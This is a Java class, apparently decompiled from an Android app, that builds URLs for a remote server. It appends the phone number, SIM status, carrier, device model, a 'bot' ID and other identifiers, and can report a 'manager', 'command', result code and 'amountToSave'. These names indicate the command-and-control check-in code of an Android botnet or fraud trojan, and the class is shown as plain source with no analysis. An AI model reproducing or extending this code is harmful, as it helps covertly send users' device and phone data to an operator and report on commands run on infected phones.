package sx.jolly.utils;

import android.content.Context;

public class Url {
    private String action = null;
    private boolean addParams = false;
    private boolean addResult = false;
    private String amount = null;
    private String command = null;
    private Context context = null;
    private String manager = null;
    private String query = "";
    private String result = null;
    private String server = null;

    public Url(String action, boolean addParams, boolean addResult, Context c) {
        this.context = c;
        setAction(action);
        setAddParams(addParams);
        setAddResult(Boolean.valueOf(addResult));
    }

    public void addQueryString(String query) {
        this.query = query;
    }

    private String getManager() {
        return this.manager;
    }

    public void setManager(String manager) {
        this.manager = manager;
    }

    private String getCommand() {
        return this.command;
    }

    public void setCommand(String command) {
        this.command = command;
    }

    private String getAmount() {
        return this.amount;
    }

    public void setAmount(String amount) {
        this.amount = amount;
    }

    public String getStringUrl() {
        String host = getServer() + getAction();
        String query = null;
        if (this.addParams) {
            String sdk = Utils.getBotSDK();
            String packagename = Utils.getPackageName(this.context);
            String partner = Utils.getPartner(this.context);
            String operator = Utils.getOperatorName(this.context);
            String botnumber = Utils.getBotNumber(this.context);
            String hassim = Utils.detectSIM(this.context);
            String manufacturer = Utils.getDeviceManufacturer();
            String model = Utils.getDeviceModel();
            String uid = Utils.getBotId(this.context);
            query = this.query + "sdk/" + sdk + "/application/" + packagename + "/partner/" + partner + "/operator/" + operator + "/botNumber/" + botnumber + "/hasSIM/" + hassim + "/manufacturer/" + manufacturer + "/model/" + model + "/uid/" + uid + "/version/" + Utils.getAppVersion(this.context);
        }
        if (this.addResult) {
            query = new StringBuilder(String.valueOf(query)).append("/manager/").append(getManager()).append("/command/").append(getCommand()).append("?resultCode=").append(getResult()).toString();
        }
        if (this.addResult && getAmount() != "") {
            query = new StringBuilder(String.valueOf(query)).append("&amountToSave=").append(getAmount()).toString();
        }
        return new StringBuilder(String.valueOf(host)).append(query).toString();
    }

    private String getResult() {
        return this.result;
    }

    public void setResult(String result) {
        this.result = result;
    }

    private boolean isAddParams() {
        return this.addParams;
    }

    private void setAddParams(boolean addParams) {
        this.addParams = addParams;
    }

    private String getServer() {
        return this.server;
    }

    public void setServer(String server) {
        this.server = server;
    }

    private String getAction() {
        return this.action;
    }

    private void setAction(String action) {
        this.action = action;
    }

    private boolean getAddResult() {
        return this.addResult;
    }

    private void setAddResult(Boolean addResult) {
        this.addResult = addResult.booleanValue();
    }
}
